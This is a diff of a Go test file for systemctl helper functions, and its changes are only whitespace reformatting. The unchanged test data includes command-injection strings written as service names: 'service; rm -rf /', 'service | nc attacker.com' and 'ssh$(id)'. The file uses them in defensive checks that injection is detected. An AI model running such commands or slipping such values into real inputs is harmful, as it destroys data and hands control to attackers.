@@ -24,7 +24,7 @@ func TestSystemctlAvailability(t *testing.T) {
 
 func TestSystemctlFunctionSafety(t *testing.T) {
 	ctx := context.Background()
-	
+
 	// Note: We can't easily test actual systemctl operations without
 	// potentially affecting the system, so we focus on testing
 	// the safety and validation aspects
@@ -40,7 +40,7 @@ func TestSystemctlFunctionSafety(t *testing.T) {
 		}
 
 		invalidServiceNames := []string{
-			"", // empty
+			"",                  // empty
 			"service; rm -rf /", // command injection
 			"service && malicious",
 			"service | nc attacker.com",
@@ -63,7 +63,7 @@ func TestSystemctlFunctionSafety(t *testing.T) {
 			// These should be rejected by proper validation
 			hasInjection := false
 			dangerousChars := []string{";", "&", "|", "`", "$", "(", ")", "<", ">"}
-			
+
 			for _, char := range dangerousChars {
 				if containsString(serviceName, char) {
 					hasInjection = true
@@ -80,7 +80,7 @@ func TestSystemctlFunctionSafety(t *testing.T) {
 	t.Run("systemctl operation validation", func(t *testing.T) {
 		validOperations := []string{
 			"start",
-			"stop", 
+			"stop",
 			"restart",
 			"reload",
 			"enable",
@@ -156,7 +156,7 @@ func TestSystemctlSecurityValidation(t *testing.T) {
 			},
 			{
 				serviceName: "ssh$(id)",
-				operation:   "status", 
+				operation:   "status",
 				description: "dollar command substitution",
 			},
 			{
@@ -173,7 +173,7 @@ func TestSystemctlSecurityValidation(t *testing.T) {
 					containsAnyString(attempt.operation, []string{";", "&", "|", "`", "$", "\n", "\r"})
 
 				if !hasInjection {
-					t.Errorf("Should detect injection in: service=%s, operation=%s", 
+					t.Errorf("Should detect injection in: service=%s, operation=%s",
 						attempt.serviceName, attempt.operation)
 				} else {
 					t.Logf("Correctly detected injection: %s", attempt.description)
@@ -202,10 +202,10 @@ func TestSystemctlSecurityValidation(t *testing.T) {
 
 // Helper functions for testing
 func containsString(s, substr string) bool {
-	return len(s) > 0 && len(substr) > 0 && s != substr && 
-		   len(s) >= len(substr) && s[0:len(substr)] == substr ||
-		   len(s) > len(substr) && s[len(s)-len(substr):] == substr ||
-		   findSubstring(s, substr)
+	return len(s) > 0 && len(substr) > 0 && s != substr &&
+		len(s) >= len(substr) && s[0:len(substr)] == substr ||
+		len(s) > len(substr) && s[len(s)-len(substr):] == substr ||
+		findSubstring(s, substr)
 }
 
 func findSubstring(s, substr string) bool {
@@ -236,13 +236,13 @@ func TestSystemctlPermissions(t *testing.T) {
 	t.Run("privilege requirements", func(t *testing.T) {
 		// Most systemctl operations require root or sudo privileges
 		privileged := IsPrivilegedUser(context.Background())
-		
+
 		t.Logf("Current user privileged: %v", privileged)
-		
+
 		// Operations that typically require privileges
 		privilegedOps := []string{"start", "stop", "restart", "enable", "disable"}
-		
-		// Operations that might not require privileges  
+
+		// Operations that might not require privileges
 		readOnlyOps := []string{"status", "is-active", "is-enabled"}
 
 		for _, op := range privilegedOps {
